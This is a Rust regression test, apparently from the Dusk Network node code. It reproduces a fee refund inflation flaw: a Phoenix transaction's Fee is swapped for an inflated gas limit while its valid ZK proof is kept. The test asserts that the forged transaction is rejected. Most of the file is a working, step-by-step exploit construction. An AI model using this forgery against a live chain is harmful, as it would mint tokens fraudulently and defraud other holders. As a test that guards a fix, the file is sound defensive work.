// This Source Code Form is subject to the terms of the Mozilla Public
// License, v. 2.0. If a copy of the MPL was not distributed with this
// file, You can obtain one at http://mozilla.org/MPL/2.0/.
//
// Copyright (c) DUSK NETWORK. All rights reserved.

//! PoC: Phoenix Fee Refund Inflation
//!
//! The Fee struct (gas_limit, gas_price) is excluded from the payload hash
//! that feeds into the ZK proof. An attacker creates a valid Phoenix
//! transaction with a normal fee, then replaces the Fee with an inflated
//! gas_limit. The refund note is worth
//! `(inflated_gas_limit - gas_spent) * gas_price` DUSK — minting tokens
//! from thin air.

use dusk_core::transfer::Transaction;
use dusk_core::transfer::phoenix::{
    Fee, Payload, Transaction as PhoenixTransaction, TxSkeleton,
};
use dusk_rusk_test::common::state::ExecuteResult;
use dusk_rusk_test::{Result, RuskVmConfig, TestContext};
use rand::SeedableRng;
use rand::rngs::StdRng;
use tracing::info;

use crate::common::logger;
use crate::common::state::generator_procedure;

const BLOCK_GAS_LIMIT: u64 = 100_000_000_000;

/// Verifies that a Phoenix transaction with a replaced (inflated) Fee is
/// rejected and the refund does NOT inflate the supply.
///
/// - FAILS while the vulnerability is active: the malicious tx executes and the
///   sender ends up with more balance than they started with.
/// - PASSES once the fix is applied: the malicious tx is rejected during
///   preverify or execution, and no inflation occurs.
#[tokio::test(flavor = "multi_thread")]
pub async fn fee_refund_inflation_poc() -> Result<()> {
    logger();

    let state_toml = include_str!("../config/transfer.toml");
    let vm_config = RuskVmConfig::new().with_block_gas_limit(BLOCK_GAS_LIMIT);
    let tc = TestContext::instantiate(state_toml, vm_config).await?;

    let wallet = tc.wallet();
    let rusk = tc.rusk();
    let mut rng = StdRng::seed_from_u64(0xdead);

    // Record the sender's initial balance
    let initial_balance =
        wallet.get_balance(0).expect("Failed to get balance").value;
    info!("=== Phoenix Fee Refund Inflation PoC ===");
    info!("Initial balance: {} LUX", initial_balance);

    // Generate a receiver pk (we send to ourselves for simplicity)
    let receiver_pk = wallet
        .phoenix_public_key(0)
        .expect("Failed to get public key");

    // Step 1: Create a legitimate transaction with normal gas parameters
    let honest_gas_limit: u64 = 100_000_000;
    let honest_gas_price: u64 = 1;
    let transfer_value = 0;

    let tx = wallet
        .phoenix_transfer(
            &mut rng,
            0,
            &receiver_pk,
            transfer_value,
            honest_gas_limit,
            honest_gas_price,
        )
        .expect("Failed to create transaction");

    info!(
        "Honest tx: gas_limit={}, gas_price={}, max_fee={}",
        honest_gas_limit,
        honest_gas_price,
        honest_gas_limit * honest_gas_price
    );

    // Step 2: Extract the inner PhoenixTransaction to access proof, fee, etc.
    let phoenix_tx = match &tx {
        Transaction::Phoenix(ptx) => ptx,
        _ => panic!("Expected a Phoenix transaction"),
    };

    // Step 3: Reconstruct the transaction with an inflated Fee
    //
    // The Fee struct is excluded from the payload hash (see
    // Payload::to_hash_input_bytes), so we can replace it without
    // invalidating the ZK proof.
    let inflated_gas_limit: u64 = 1_000_000_000_000; // 10^12
    let inflated_gas_price: u64 = 1;

    let proof_bytes = phoenix_tx.proof().to_vec();
    let original_fee = phoenix_tx.fee();

    // Build a new Fee with same stealth_address/sender but inflated gas_limit
    let inflated_fee = Fee {
        gas_limit: inflated_gas_limit,
        gas_price: inflated_gas_price,
        stealth_address: original_fee.stealth_address,
        sender: original_fee.sender,
    };

    // Reconstruct TxSkeleton from the valid transaction
    let tx_skeleton = TxSkeleton {
        root: *phoenix_tx.root(),
        nullifiers: phoenix_tx.nullifiers().to_vec(),
        outputs: phoenix_tx.outputs().clone(),
        max_fee: phoenix_tx.max_fee(),
        deposit: phoenix_tx.deposit(),
    };

    // Build the Payload with inflated fee
    let payload = Payload {
        chain_id: phoenix_tx.chain_id(),
        tx_skeleton,
        fee: inflated_fee,
        data: None, // simple transfer, no contract call
    };

    // Assemble the malicious transaction — valid proof, inflated fee
    let malicious_phoenix_tx =
        PhoenixTransaction::from_payload_and_proof(payload, proof_bytes);
    let malicious_tx: Transaction = malicious_phoenix_tx.into();

    info!(
        "Malicious tx: gas_limit={}, gas_price={}, max_fee={}",
        inflated_gas_limit,
        inflated_gas_price,
        inflated_gas_limit * inflated_gas_price
    );

    // Step 4: Execute through the full pipeline (including preverify)
    //
    // After the fix, this should return an error (tx rejected).
    // While vulnerable, this succeeds and the refund inflates the supply.
    let _result = generator_procedure(
        rusk,
        &[malicious_tx],
        2, // block_height
        BLOCK_GAS_LIMIT,
        vec![],
        Some(ExecuteResult {
            executed: 0,
            discarded: 1,
        }),
    );

    // Step 5: Check the sender's balance after the attack
    let final_balance =
        wallet.get_balance(0).expect("Failed to get balance").value;

    info!("Final balance: {} LUX", final_balance);
    info!(
        "Balance change: {} LUX",
        final_balance as i128 - initial_balance as i128
    );

    // Step 6: Assert NO inflation occurred.
    //
    // While the vulnerability is active, the inflated fee causes the
    // refund note to be worth ~10^12 LUX, so final_balance >
    // initial_balance, and this assertion FAILS.
    //
    // Once fixed, the tx is rejected and no balance change occurs
    // (or at worst the balance stays the same), so this PASSES.
    assert!(
        final_balance <= initial_balance,
        "SUPPLY INFLATION: balance went from {} to {} LUX — \
         the Fee replacement minted {} LUX from nothing. \
         The malicious transaction should have been rejected.",
        initial_balance,
        final_balance,
        final_balance - initial_balance
    );

    Ok(())
}
